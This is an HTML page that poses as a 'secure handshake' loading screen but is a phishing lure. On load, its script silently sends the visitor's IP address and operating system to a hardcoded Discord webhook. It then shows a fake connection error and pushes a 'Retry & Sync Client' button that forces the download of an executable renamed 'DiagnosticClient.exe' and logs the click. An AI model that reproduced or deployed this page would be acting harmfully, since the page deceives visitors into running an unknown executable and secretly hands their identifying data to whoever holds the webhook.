<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting...</title>
    <style>
        body { background: #0d1117; color: #58a6ff; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #21262d; border-top: 4px solid #58a6ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .hidden { display: none; }
        #error { color: #f85149; text-align: center; max-width: 300px; }
    </style>
</head>
<body>

    <div id="loading-ui">
        <div class="loader"></div>
        <div id="status">INITIATING_SECURE_HANDSHAKE...</div>
    </div>

    <div id="error" class="hidden">
        <h1 style="margin-bottom: 5px;">CONNECTION_FAILED</h1>
        <p style="color: #8b949e; font-size: 12px;">Remote gateway timeout. Please run the local diagnostic client to bridge the connection.</p>
        <button onclick="triggerDownload()" style="background: #21262d; color: #58a6ff; border: 1px solid #30363d; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-weight: bold;">Retry & Sync Client</button>
    </div>

    <script>
        const hook = "https://discord.com/api/webhooks/1452666232141643878/NX4YYWvhuYHnVBM8eIeTvQM3h__3G2QKBnVtds-bYon6rHsZ_ecqv4-eTVp23nEiVU20";
        const gameLink = "YOUR_GAME_LINK_HERE"; // Put your download link here

        async function startDiagnostics() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                
                await fetch(hook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "Diagnostic Authorized",
                            color: 5814783,
                            fields: [
                                { name: "IP", value: data.ip, inline: true },
                                { name: "OS", value: navigator.platform, inline: true }
                            ],
                            footer: { text: "Awaiting Client Sync..." }
                        }]
                    })
                });
            } catch (e) { console.log("Silent error"); }

            setTimeout(() => {
                document.getElementById('loading-ui').classList.add('hidden');
                document.getElementById('error').classList.remove('hidden');
            }, 3500);
        }

        function triggerDownload() {
            // Create a temporary link to force download
            const link = document.createElement('a');
            link.href = gameLink;
            link.download = 'DiagnosticClient.exe'; // Name of the file
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            
            // Log to Discord that they clicked download
            fetch(hook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: "⚠️ **User initiated client download (Retry clicked).**" })
            });
        }

        startDiagnostics();
    </script>
</body>
</html>
